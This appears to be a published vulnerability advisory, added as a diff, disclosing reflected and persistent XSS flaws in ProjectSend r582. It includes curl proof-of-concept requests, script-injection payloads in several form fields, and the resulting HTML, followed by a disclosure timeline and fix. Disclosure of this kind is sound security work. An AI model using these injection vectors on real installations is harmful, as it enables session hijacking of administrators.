@@ -1,0 +1,86 @@
+* Exploit Title: Multiple (persistent) XSS in ProjectSend
+* Discovery Date: 2016/02/19
+* Public Disclosure Date: 2016/03/17
+* Exploit Author: Michael Helwig
+* Contact: https://twitter.com/c0dmtr1x
+* Project Homepage: http://www.projectsend.org/
+* Software Link: http://www.projectsend.org/download/108/
+* Version: r582
+* Tested on: Ubuntu 14.04 with Firefox 45.0
+* Category: webapps
+
+Description
+========================================================================
+
+ProjectSend is a self-hosted PHP based file-transfer platform. Several serious vulnerabilities have been discovered so far (e.g. https://www.exploit-db.com/exploits/39385/). Here are some further persistent and non-persistent XSS vulnerabilities which affect ProjectSend.
+
+PoC
+========================================================================
+
+1. Non-Persistent XSS
+~~~~~~~~~~~~~~~~~~~~~~
+
+1.1 - As client in searchbox on my_files/index.php:
+
+curl 'http://projectsend.local.de/my_files/' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=2pgk2ehohqbqmgfr618sisqui2' -H 'Host: projectsend.local.de' -H 'Referer: http://projectsend.local.de/my_files/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Content-Type: application/x-www-form-urlencoded' --data 'search=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E'
+
+
+1.2 - As admin in searchboxes on "Manage Clients", "Clients groups" and "System Users":
+
+curl 'http://projectsend.local.de/clients.php' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=2pgk2ehohqbqmgfr618sisqui2' -H 'Host: projectsend.local.de' -H 'Referer: http://projectsend.local.de/clients.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Content-Type: application/x-www-form-urlencoded' --data 'search=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
+
+Output:
+
+<input type="text" name="search" id="search" value=""><script>alert('XSS')</script>" class="txtfield form_actions_search_box" />
+
+The searchboxes on "Clients groups", "System Users" and the "Recent activities log" are injectible in the same way.
+
+
+2. Persistent XSS
+~~~~~~~~~~~~~~~~~~
+
+1.1 - As client in "MyAccount" field "Name":
+
+No special vector required.
+HTML output for input "><script>alert(1);</script>:
+
+<input type="text" name="add_client_form_name" id="add_client_form_name" class="required" value=""><script>alert(1);</script>" placeholder="Will be visible on the client's file list" />
+
+This XSS also affects admins when they open the "Clients" -> "Manage clients" page:
+
+clients.php html output:
+<td><input type="checkbox" name="selected_clients[]" value="2" /></td>
+<td>"><script>alert(1);</script></td>
+<td>Client1</td>
+
+The fields "Adress" and "Telephone" are injectible in the same way.
+
+
+1.2  As client in "File upload" field "Name":
+
+A simple vector suffices: "<script>alert('XSS')</script>
+The XSS is activated when admins open the dashboard (the code gets loaded from /actions-log.php via ajax) or when he accesses the "Recent activities log"
+
+actions-log.php html output:
+<td class="footable-visible">"<script>alert('XSS')</script></td>
+
+
+1.3 As admin in "Groups" -> "Add new"
+
+The fields "Name" and "Description" are injectible. The XSS is activated on the "Manage groups" page.
+Simple vector: "><script>alert('XSS')</script>
+
+
+Timeline
+========================================================================
+
+2016/02/19 - Issues discovered
+2016/02/22 - Developed fixes for these and multiple other vulnerabilities. 
+             Informed project maintainers
+2016/03/04 - Fixes merged into master branch by project maintainers
+
+
+Solution
+========================================================================
+
+Update to current version from GitHub. See https://github.com/ignacionelson/ProjectSend/issues/80 for discussion.
